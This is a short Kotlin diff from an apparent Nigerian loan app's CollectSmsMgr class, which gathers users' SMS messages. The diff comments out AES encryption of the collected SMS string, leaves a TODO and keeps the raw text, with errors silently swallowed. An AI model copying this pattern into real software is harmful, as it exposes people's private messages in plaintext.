@@ -4,13 +4,17 @@ import android.net.Uri
 import android.text.TextUtils
 import android.util.Log
 import androidx.annotation.VisibleForTesting
+import com.blankj.utilcode.util.EncodeUtils
 import com.blankj.utilcode.util.GsonUtils
 import com.blankj.utilcode.util.StringUtils
 import com.blankj.utilcode.util.Utils
 import com.chocolate.nigerialoanapp.BuildConfig
 import com.chocolate.nigerialoanapp.collect.BaseCollectDataMgr
+import com.chocolate.nigerialoanapp.collect.utils.AESUtil
 import com.chocolate.nigerialoanapp.global.Constant
 import com.chocolate.nigerialoanapp.log.LogSaver
+import com.chocolate.nigerialoanapp.network.NetworkUtils
+import org.json.JSONArray
 import java.util.regex.Pattern
 
 class CollectSmsMgr {
@@ -50,7 +54,9 @@ class CollectSmsMgr {
         }
         var aesSmsStr = ""
         try {
-            aesSmsStr = mSmsStr!!
+            // TODO
+//            aesSmsStr =  AESUtil.encrypt(mSmsStr!!)
+            aesSmsStr =  mSmsStr!!
         } catch (e : Exception) {
 
         }
